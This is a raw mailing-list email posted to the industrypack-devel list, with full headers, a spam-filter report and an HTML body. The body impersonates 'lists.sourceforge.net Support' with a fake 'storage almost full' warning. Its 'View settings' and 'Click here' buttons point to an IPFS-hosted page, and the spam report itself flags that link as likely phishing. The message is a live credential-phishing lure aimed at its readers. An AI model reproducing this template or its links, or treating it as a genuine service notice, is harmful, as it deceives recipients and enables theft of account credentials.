Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 4F7508C5B61
	for <lists+industrypack-devel@lfdr.de>; Tue, 14 May 2024 20:51:48 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1s6xFa-0003Q2-MY
	for lists+industrypack-devel@lfdr.de;
	Tue, 14 May 2024 18:51:47 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mail@akelloandassociate.com>) id 1s6xFZ-0003Pv-Jx
 for industrypack-devel@lists.sourceforge.net;
 Tue, 14 May 2024 18:51:46 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=7rImd9C7zzZm6tuFR6q/Wbxc/YoiqICLKvipEUJDI2Q=; b=f9hBkLJak0Ao8I3OqC0GtBE6De
 RLfLjgWnLF24t0ODpBrfW0J3O7HX+hbwIljj8c4Hm7L60GjPl39/VhZ1liJHV4FaKrFyumYHP3d4A
 1ULOy86F0erYO1GApccoY+BJTGhowCc5qnoSs5llyoaGsiUf/S4+XMMmNcZVjSzz+8aA=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=7rImd9C7zzZm6tuFR6q/Wbxc/YoiqICLKvipEUJDI2Q=; b=O
 /9YhsWFhJVUfl28ym6UsDO9Hx1ecPDI7gCgnSSE2jwJwbmB219goB6zh8BLiA8yZNGpfThdYEe3xb
 v7bYyTP3GVwhIlZ2zfeXauVe1Mw41bw5A7tN5qvvRxgssOlY0IJW4gvSm9JjffIsIV4A99oHYIz4E
 2gFoVzLRbyt/Da8Q=;
Received: from [93.185.159.247] (helo=mail9.akelloandassociate.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1s6xFa-0005px-1W for industrypack-devel@lists.sourceforge.net;
 Tue, 14 May 2024 18:51:45 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim;
 d=akelloandassociate.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=mail@akelloandassociate.com;
 bh=7rImd9C7zzZm6tuFR6q/Wbxc/YoiqICLKvipEUJDI2Q=;
 b=G4N0mhqYL+dWdcx9DQl9W23IAfj7rJutmFuIXRJ+s3pNFu9O+gBDnXPtyHE2Vh1ORf5VJo2P7kWA
 ItohoIloNMH/Eq9k5cS9TbuWk9e9sMlEWeCxfjJ0VCkKQKIw9JgTqSVesRpy9zYy/YgL/eWMU6Mz
 U/aMy5grETSfyq2l+TXJ60mo4V2/HYKbay0XE3PjdLL+brAc3xmnBRi3uxy1RTpkcjPHUBRDrZ2h
 LzuFsDnFcp8RPQEoQ+152f2VEIippdWJAbSP3QiQgMzf2FSxEn2nOaR02PgCNges8eeK/v/Ccl4E
 6X5fMb9oc1xYch/MjkvqDegig5k0uM2BkxFekg==
From: lists.sourceforge.net<mail@akelloandassociate.com>
To: industrypack-devel@lists.sourceforge.net
Date: 14 May 2024 20:51:36 +0200
Message-ID: <20240514205136.0C751B6E27C24E9B@akelloandassociate.com>
MIME-Version: 1.0
X-Spam-Score: 6.5 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  98.3 GB used,
 94% of 99 GB. ATTN: industrypack-devel@lists.sourceforge.net, 
 Your "industrypack-devel" account is almost full and you have run out of
 storage space. Go to View all settings to authorize purging of unwanted
 documents and messages. 
 Content analysis details:   (6.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: cloudflare-ipfs.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 2.5 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
 content via CloudFlare, likely phishing
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.5 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
 website + no rDNS
 2.4 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
X-Headers-End: 1s6xFa-0005px-1W
Subject: [Industrypack-devel] System Downtime (Action Required)
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8807339114717639922=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8807339114717639922==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
rdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS:=
 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: norma=
l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
on-thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
=3D"325" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; HEIGHT: 0.5em">
<td style=3D"BOX-SIZING: border-box; WIDTH: 321px; BACKGROUND: rgb(218,60,4=
7); MARGIN: 0px"><FONT face=3D"Segoe UI">&nbsp;</FONT></TD>
<td style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(224,224,224); MARGIN: =
0px"><FONT face=3D"Segoe UI">&nbsp;</FONT></TD></TR></TBODY></TABLE>
<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
rdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS:=
 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: norma=
l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
on-thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
=3D"325" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; TEXT-ALIGN: left; MARGIN: 0px"><FONT c=
olor=3D#ff0000>98.3 GB used, 94% of 99 GB.</FONT></TD></TR></TBODY></TABLE>=

<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
rdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS:=
 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: norma=
l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
on-thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
=3D"325" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box"></TBODY></TABLE>
<table style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT:=
 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETT=
ER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: norm=
al; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; tex=
t-decoration-style: initial; text-decoration-color: initial; font-variant-n=
umeric: inherit; font-variant-east-asian: inherit;=20
font-stretch: inherit" dir=3D"ltr">
<TBODY>
<TR>
<td id=3D"m_8330243534843323916m_-4121981575604976097m_-3491940333626431258=
m_-8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gma=
il-x_x_i10_mr_css_attr" style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe =
UI&quot;, Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING=
-BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
GHT: 0px">
<P><B>ATTN: industrypack-devel@lists.sourceforge.net,<BR></B><BR>Your "<FON=
T color=3D#2c59d3>industrypack-devel</FONT>" account is almost full and you=
 have run out of storage space.<BR>Go to View all settings to authorize pur=
ging of unwanted documents and messages.</P></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe UI&quot;, Tahoma, Ve=
rdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px; PADDIN=
G-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<table cellspacing=3D"0" border=3D"0">
<TBODY>
<TR>
<td style=3D"MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDIN=
G-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,11=
4,236)" bgcolor=3D"#2672ec">
<A id=3Dm_8330243534843323916m_-4121981575604976097m_-3491940333626431258m_=
-8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gmail=
-x_x_i11_mr_css_attr style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Segoe U=
I Semibold", "Segoe UI Bold", "Segoe UI", "Helvetica Neue Medium", Arial, s=
ans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM=
-WIDTH: 0px; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px=
; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=20
LETTER-SPACING: 0.02em; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-str=
etch: inherit; text-decoration-line: none' href=3D"https://cloudflare-ipfs.=
com/ipfs/bafkreigwvnwjiwr4fl6pwxfaaoro5x46zi7klxxuka3z2ez5xgqvrg2hjm?filena=
me=3Dgrgeon221.html#industrypack-devel@lists.sourceforge.net" rel=3D"noopen=
er noreferrer" target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
pfs.com/ipfs/bafkreiexrpykdb6634fcxcordg2j5he7efxedjfenf764f25gmzxqzzjdm%23=
%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1713379845859000&amp;usg=
=3DAOvVaw0yaHSPGKEKF9sgrN0bejl-">View lists.sourceforge.net settings</A></T=
D></TR></TBODY></TABLE></TD></TR>
<TR>
<td id=3D"m_8330243534843323916m_-4121981575604976097m_-3491940333626431258=
m_-8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gma=
il-x_x_i12_mr_css_attr" style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe =
UI&quot;, Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING=
-BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
GHT: 0px">
To opt out or change where you receive security notifications,&nbsp;<A id=
=3Dm_8330243534843323916m_-4121981575604976097m_-3491940333626431258m_-8153=
822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gmail-x_x_=
iLink5_mr_css_attr style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px=
; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(38,114,236=
); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
ADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px;=20
text-decoration-line: none" href=3D"https://cloudflare-ipfs.com/ipfs/bafkre=
igwvnwjiwr4fl6pwxfaaoro5x46zi7klxxuka3z2ez5xgqvrg2hjm?filename=3Dgrgeon221.=
html#industrypack-devel@lists.sourceforge.net" rel=3D"noopener noreferrer" =
target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp=
s://cloudflare-ipfs.com/ipfs/bafkreiexrpykdb6634fcxcordg2j5he7efxedjfenf764=
f25gmzxqzzjdm%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1713379845=
859000&amp;usg=3DAOvVaw0yaHSPGKEKF9sgrN0bejl-">Click here</A>.</TD></TR>
<TR>
<td id=3D"m_8330243534843323916m_-4121981575604976097m_-3491940333626431258=
m_-8153822838275037621m_-2602578588484872429gmail-m_-2922676154068261556gma=
il-x_x_i13_mr_css_attr" style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;Segoe =
UI&quot;, Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING=
-BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
GHT: 0px">Thanks,<BR>lists.sourceforge.net Support.</TD></TR></TBODY></TABL=
E>
<P></P></BODY></HTML>


--===============8807339114717639922==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8807339114717639922==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8807339114717639922==--
